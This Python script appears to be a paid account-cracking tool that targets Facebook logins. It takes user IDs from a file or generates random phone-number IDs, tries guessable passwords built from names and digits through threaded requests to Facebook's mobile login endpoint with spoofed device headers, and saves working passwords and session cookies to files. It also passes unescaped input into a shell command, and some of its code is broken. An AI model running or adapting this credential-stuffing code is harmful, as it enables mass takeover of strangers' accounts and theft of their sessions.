#_________________________________________________
#SCRIPT CRATE BY: TOHA
#SCRIPT VERSION: 12.45.1.2.0
#SCRIPT UPDATE DATE: 23/JUL/2023 - 02.17 AM. 
#PYTHON LANGUAGE.
#_________________________________________________
#________ɪᴍᴘᴏʀᴛ_ᴍᴏᴅɪᴜʟ____________#
import os
from os import path
from pathlib import Path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
try:
	import requests,os,json,time,re,random,sys,uuid,string
	from string import *
	from requests import api
	from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
	os.system('pip install requests futures==2 > /dev/null')
	os.system('python RUN.py') 
#________ᴄʀᴇᴀᴛ_ᴅᴀᴛᴇ____________#
def Date(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :toha = ' [2009]'
        elif uid[:9] in ['100000000']       :toha = ' [2009]'
        elif uid[:8] in ['10000000']        :toha = ' [2009]'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:toha = ' [2009]'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:toha = ' [2010]'
        elif uid[:6] in ['100001']          :toha = ' [2011]'
        elif uid[:6] in ['100002','100003'] :toha = ' [2012]'
        elif uid[:6] in ['100004']          :toha = ' [2013]'
        elif uid[:6] in ['100005','100006'] :toha = ' [2014]'
        elif uid[:6] in ['100007','100008'] :toha = ' [2014]'
        elif uid[:6] in ['100009']          :toha = ' [2015]'
        elif uid[:5] in ['10001']           :toha = ' [2016]'
        elif uid[:5] in ['10002']           :toha = ' [2017]'
        elif uid[:5] in ['10003']           :toha = ' [2019]'
        elif uid[:5] in ['10004']           :toha = ' [2020]'
        elif uid[:5] in ['10005']           :toha = ' [2020]'
        elif uid[:5] in ['10006','10007','']:toha = ' [2021]'
        elif uid[:5] in ['10008']           :toha = ' [2022]'
        elif uid[:5] in ['10009']           :toha = ' [2023]'
        else:toha=''
    elif len(uid) in [9,10]:
        toha = ' [2008/2009]'
    elif len(uid)==8:
        toha = ' [2007/2008]'
    elif len(uid)==7:
        toha = ' [2006/2007]'
    else:toha=''
    return toha
    
	#________ᴍᴏᴅɪᴜʟs____________#
oks=[]
twofs=[]
cps=[]
loop=0
huwaiwe=[]
#________ᴜsᴇʀ ᴀɢᴇɴᴛ____________#
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(9, 14)
	c=random.randrange(2, 7)
	z=random.choice(['ANY-LX1', 'HRY-LX1', 'HRY-LX1MEB', 'HRY-LX2', 'HRY-AL00a', 'HRY-AL00', 'HRY-TL00', 'HRY-LX1T', 'YAL-TL00', 'YAL-L21', 'YAL-AL00', 'LRA-TL00', 'LRA-AL00', 'YAL-AL10', 'BMH-AN20', 'MXW-AN00', 'EBG-AN10', 'JLH-AN00', 'GIA-AN00', 'FNE-NX9', 'SDY-AN00', 'HPB-AN00', 'Mi Mix 3 5G', 'ANP-AN00', 'HLK-AL10'])
	d='Build/'
	x=random.randrange(195357, 230905) 
	y=random.randrange(1, 10) 
	e=random.choice(['HONORHLK-AL10', 'HONORHLK-L42', 'HONORHLK-L41', 'MXW-AN00', 'HONORLRA-AL00', 'HUAWEIEBG-AN10']) 
	f='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	ff=random.randrange(67, 115)
	gf=random.randrange(4012, 6536)
	bf=random.randrange(112, 195)
	g=random.choice(['81.0.4044.138', '113.0.5672.162', '114.0.5735.60', '113.0.5672.131', '114.0.5735.131', '114.0.5735.127', '114.0.5735.131', '114.0.5735.130', '107.0.5304.141', '114.0.5735.130', '115.0.5790.21', '113.0.5672.162']) 
	h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/'
	i=random.randrange(412, 498)
	j=random.randrange(28, 78)
	k=random.randrange(98, 117)
	uaku32=(f'{a} {b}; {z} {d}{e}; {f}{ff}.0.{gf}.{bf} {h}{i}.0.0.{j}.{k};]')
	huwaiwe.append(uaku32)
	useragent = random.choice(huwaiwe)
	
	
	
#________ʟᴏɢᴏ____________#
logo=('''\33[1;32m
             ==================================
             ████████╗ ██████╗ ██╗  ██╗ █████╗ 
             ╚══██╔══╝██╔═══██╗██║  ██║██╔══██╗
                ██║   ██║   ██║███████║███████║
                ██║   ██║   ██║██╔══██║██╔══██║
                ██║   ╚██████╔╝██║  ██║██║  ██║
                ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
             ==================================''') 
#________ᴏs.ᴄʟᴇᴀʀ____________#
def clear():
	os.system('clear')
	print(logo)
#________ᴘᴀssᴡᴏʀᴅ____________#
TOHA_PASS="DARK NET"
def password():
	clear()
	print('\33[1;91m====================================') 
	password=input('\33[1;32m[√]ENTER YOU PASSWORD:')
	if password in TOHA_PASS:
		print('\33[1;92m[💘] CONGRATULATIONS CORRECT PASSWORD') 
		time.sleep(2)
		Run()
	else:
		print('\33[1;91m[🖕] WRONG PASSWORD') 
		time.sleep(2)
		wp=('JL9n4yE1f5L36yWIKSs4QD')
		os.system(f'xdg-open https://www.facebook.com/profile.php?id=100055743736170')
		exit('\33[1;32mCONTAT WITH ADMIN')
#________ʀᴜɴ____________#
def Run():
	clear()
	print('\33[1;32m                     ╔═════════════════╗')
	print('\33[1;32m                     ║AUTHOR:MR. TOHA  ║')
	print('\33[1;32m                     ║GITHUB:salmantoha║')
	print('\33[1;32m                     ║WHATS:01868923766║')
	print('\33[1;32m                     ║TOOLS:PAID       ║')
	print('\33[1;32m                     ║VERSION:0.2      ║')  
	print('\33[1;32m                     ╚═════════════════╝')
	print('\33[1;31m             ====================================') 
	print('\33[1;32m                     ║ [A]FILE CLONE   ║')
	print('\33[1;31m                     ╚═════════════════╝')
	print('\33[1;32m                     ║ [B]RANDOM CLONE ║')
	print('\33[1;31m                     ╚═════════════════╝')
	print('\33[1;32m                     ║ [C]CONTACT ADMIN║')
	print('\33[1;31m                     ╚═════════════════╝')
	print('\33[1;32m                         ║ [X]EXIT ║')
	print('\33[1;31m             ====================================') 
	creack=input('\33[1;32m[√]SELECT OPTION: ')
	if creack == 'A':
		file_creack()
	if creack == 'B':
		bd()
	if creack == 'C':
		wp=('JL9n4yE1f5L36yWIKSs4QD')
		os.system(f'xdg-open https://www.facebook.com/profile.php?id=100055743736170')
		Run() 
	if creack == 'X':
		exit('\33[1;32mTHANKS FOR USING MY TOOL')
	else:
		print('\033[1;32m[√]SELECT VALID OPTION\033[1;32m ')
		time.sleep(0.5)
		Run() 
		

#________ғɪʟᴇ_ᴄʀᴇᴀᴄᴋ____________#
def file_creack():
	clear()
	print('\33[1;91m====================================') 
	try:
		print('\33[1;91m[1]<[2]<[3]') 
		limit = int(input('\033[1;32m[√]How Many Links Do You Want To Separate : '))
	except:
		limit = 1
	print('\033[1;32m[√]File Path Example /sdcard/Toha.txt')
	file_name = input('\033[1;32m[√]Input file path : ')
	print('\33[1;91m====================================') 
	print('\033[1;32m[√]Save As Example /sdcard/Tohaxx.txt')
	new_save = input('\033[1;32m[√]Save new file as : ') 
	print('\33[1;91m====================================') 
	y = 0
	print(f"\033[1;32m[√]Ids To Grabb Ex [100087,10009,10007]")
	for k in range(limit):
		y+=1
		links=input('\033[1;32m[√]Put Uid Type : ')
		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
	print('\33[1;91m====================================') 
	print('\033[1;32m[√]IDS GRABBED SUCCESSFULLY}')
	print('\33[1;91m====================================') 
	time.sleep(2)
	try:
		fo = open(new_save).read().splitlines()
	except FileNotFoundError:
		print('\033[1;31m[+]FILE LOCATION NOT FOUND');exit()
	clear()
	print('\33[1;91m====================================') 
	print('\33[1;92m[A] B-GRAPH') 
	print('\33[1;92m[B] GRAPH') 
	print('\33[1;92m[C] B-API') 
	print('\33[1;91m====================================') 
	methd=input('\033[1;32m[√]SELECT OPTION: ')
	plist=[]
	clear()
	try:
		print('\33[1;91m====================================') 
		ps_limit = int(input('\033[1;92m[?]HOW MANY PASWORD YOU WANT TO ADD: '))
		print('\33[1;91m====================================') 
	except:
		ps_limit =1
	print('\33[1;91m====================================') 
	print('\033[1;32m[√]EXAMPLE :\033[1;90mfirst last, firtslast, first123')
	print('\33[1;91m====================================') 
	for i in range(ps_limit):
		plist.append(input(f'\033[1;32m[√]PUT PASSWORD NO.{i+1}: '))
	with tred(max_workers=30) as RR:
		clear()
		tl = str(len(fo))
		print('\33[1;91m====================================') 
		print('\33[1;92m[+] Total accounts : \033[1;32m'+tl)
		print('\033[1;92m[√] OK IDZ SAVE IN TOHA_OK.TXT')
		print('\033[1;92m[√] CP IDZ SAVE IN TOHA_CP.TXT')
		print('\033[1;92m[√] 2F IDZ SAVE IN TOHA_2F.TXT')
		print('\033[1;92m[√] PROCESS RUNNING IN THE BACKGROUND ')
		print('\33[1;91m====================================') 
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				RR.submit(graph,ids,names,passlist)
			else:
				RR.submit(graph,ids,names,passlist)
	print() 
	print('\33[1;91m====================================') 
	print('\033[1;31m[+] THE PROCESS HAS COMPLETED')
	print('\033[1;90m[+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twofs)))
	input('\033[1;91m[√] PRESS ENTER TO BACK \033[1;37m')
	os.system('python TOHA.py')
#________ʀᴀɴᴅᴏᴍ_ᴄʀᴇᴀᴄᴋ____________#
def bd():
	user=[]
	clear()
	print('\33[1;91m====================================') 
	code = input('\33[1;32m[√] ENTER CODE :\33[1;37m ')
	try:
		limit = int(input('\33[1;32m[√] ENTER LIMIT:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		user.append(str(random.randint(11111111, 99999999)))
	passlist = ['last6digit','fullnumber','first6digit']
	with tred(max_workers=30) as RR:
		clear()
		tl = str(len(user))
		print('\33[1;91m====================================') 
		print('\33[1;92m [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;92m [+] Selected code  :\033[1;90m '+code)
		print('\033[1;92m [+] OK IDZ SAVE IN TOHA_OK.TXT')
		print('\033[1;92m [+] CP IDZ SAVE IN TOHA_CP.TXT')
		print('\033[1;92m [+] 2F IDZ SAVE IN TOHA_2F.TXT')
		print('\33[1;93m [+] Process has been started\033[1;90m')
		print('\33[1;91m====================================') 
		for psx in user:
			ids = code+psx
			RR.submit(rd1,ids,passlist)
	print() 
	print('\33[1;91m====================================') 
	print('\33[1;32m[√] The Process Has Completed')
	print('\33[1;32m[√] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twofs)))
	print('\33[1;91m====================================') 
	input('\33[1;32m[√] PRESS ENTER TO BACK \033[1;37m')
#________ᴍᴇᴛʜᴏᴅ_ɢʀᴀᴘʜ____________#
def rd1(ids,passlist):
	try:
		last6digit = ids[int(len(ids))-6:]
		first6digit = ids[0:6]
		fullnumber = ids
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;32m[TOHA]  %s | OK %s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				pas = pas.replace("first6digit",first6digit)
				pas = pas.replace("last6digit",last6digit)
				pas = pas.replace("fullnumber",fullnumber)
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				useragent = random.choice(huwaiwe)
				head = {'User-Agent': useragent,
				'Accept-Encoding':'gzip, deflate',
				'Connection':'close',
				'Content-Type':'application/x-www-form-urlencoded',
				'Host':'b-graph.facebook.com',
				'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
				'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'X-FB-Connection-Type':'unknown', 
				'X-Tigon-Is-Retry':'False',
				'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
				'x-fb-device-group':'5722',
				'X-FB-Friendly-Name':'BillingWizardNameUtilsQuery',
				'X-FB-Request-Analytics-Tags':'graphservice',
				'X-FB-HTTP-Engine':'Liger',
				'X-FB-Client-IP':'True',
				'X-FB-Server-Cluster':'True',
				'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
				data = {'adid':str(uuid.uuid4()),
				'format':'json',
				'device_id':str(uuid.uuid4()),
				'email':ids,
				'password':pas,
				'generate_analytics_claims':'1',
				'community_id':'',
				'cpl':'true',
				'try_num':'1',
				'family_device_id':str(uuid.uuid4()),
				'credentials_type':'password',
				'source':'login',
				'error_detail_type':'button_with_disabled',
				'enroll_misauth':'false',
				'generate_session_cookies':'1',
				'generate_machine_id':'1',
				'currently_logged_in_userid':'0',
				'locale':'en_TN',
				'client_country_code':'TN',
				'fb_api_req_friendly_name':'authenticate',
				'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
				if 'session_key' in po:
						uid = str(po['uid'])
						ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
						cookie = f"{ckkk}"
						print(f'\r\r\033[1;32m [TOHA-OK😱] '+uid+' | '+pas+ Date(uid))
						print('\33[1;32m╔═════════════════════════════════════════════════════════════╗')
						print(f'\33[1;32m[Cookies] == '+cookie)
						print('\33[1;32m╚═════════════════════════════════════════════════════════════╝')
						open('/sdcard/TOHA-OK.txt','a').write(uid+'|'+pas+cookie+'\n')
						oks.append(uid)
						file_path_ok = os.path.join(folder_path, 'TOHA_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'TOHA_COOKIE.txt')
						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
							file_ok.write(uid+'|'+pas+'\n')
							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
						break
				elif 'www.facebook.com' in po['error']['message']:
					if 'checkpoint' in po:
						uid = str(po['error']['error_data']['uid'])
						print(f'\r\r\033[1;32m [TOHA-2F] '+uid+' | '+pas+ Date(uid))
						twofs.append(uid)
						file_path = os.path.join(folder_path, 'TOHA-CP.txt')
						with open(file_path, 'a') as file:
							file.write(uid+'|'+pas+'\n')
						break
				elif 'www.facebook.com' in po['error']['message']:
						uid = str(po['error']['error_data']['uid'])
						print(f'\r\r\033[1;31m [TOHA-CP] '+uid+' | '+pas+ Date(uid))
						open('/sdcard/TOHA-CP.txt','a').write(uid+'|'+pas+'\n')
						cps.append(uid)
						file_path = os.path.join(folder_path, 'TOHA-CP.txt')
						with open(file_path, 'a') as file:
							file.write(uid+'|'+pas+'\n')
						break
				else:
					continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(5)
	except Exception as e:
		pass
#________ᴍᴇᴛʜᴏᴅ_ʙ-ɢʀᴀᴘʜ____________#
def graph(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;32m[TOHA]  %s | OK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			useragent = random.choice(huwaiwe)
			head = {'User-Agent':useragent,
			'Accept-Encoding':'gzip, deflate',
			'Connection':'close',
			'Content-Type':'application/x-www-form-urlencoded',
			'Host':'b-graph.facebook.com',
			'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
			'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'X-FB-Connection-Type':'WIFI',
			'X-Tigon-Is-Retry':'False',
			'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-device-group':'5120',
			'X-FB-Friendly-Name':'ViewerReactionsMutation',
			'X-FB-Request-Analytics-Tags':'graphservice',
			'X-FB-HTTP-Engine':'Liger',
			'X-FB-Client-IP':'True',
			'X-FB-Server-Cluster':'True',
			'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),
			'format':'json',
			'device_id':str(uuid.uuid4()),
			'email':ids,
			'password':pas,
			'generate_analytics_claims':'1',
			'community_id':'',
			'cpl':'true',
			'try_num':'1',
			'family_device_id':str(uuid.uuid4()),
			'credentials_type':'password',
			'source':'login',
			'error_detail_type':'button_with_disabled',
			'enroll_misauth':'false',
			'generate_session_cookies':'1',
			'generate_machine_id':'1',
			'currently_logged_in_userid':'0',
			'locale':'en_TN',
			'client_country_code':'TN',
			'fb_api_req_friendly_name':'authenticate',
			'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
			'access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					cookie = f"{ckkk}"
					print(f'\r\r\033[1;32m [TOHA-OK😱] '+uid+' | '+pas+ Date(uid))
					print('\33[1;32m╔═════════════════════════════════════════════════════════════╗')
					print(f'\33[1;32m[Cookies] == '+cookie) 
					print('\33[1;32m╚═════════════════════════════════════════════════════════════╝')
					open('/sdcard/TOHA-OK.txt','a').write(uid+'|'+pas+cookie+'\n')
					oks.append(uid)
					file_path = os.path.join(folder_path, 'TOHA_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					print(f'\r\r\033[1;31m [TOHA-CP] '+uid+' | '+pas+ Date(uid))
					open('/sdcard/TOHA-CP.txt','a').write(uid+'|'+pas+'\n')
					cps.append(uid)
					file_path = os.path.join(folder_path, 'TOHA-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(5)
	except Exception as e:
		pass
		
password()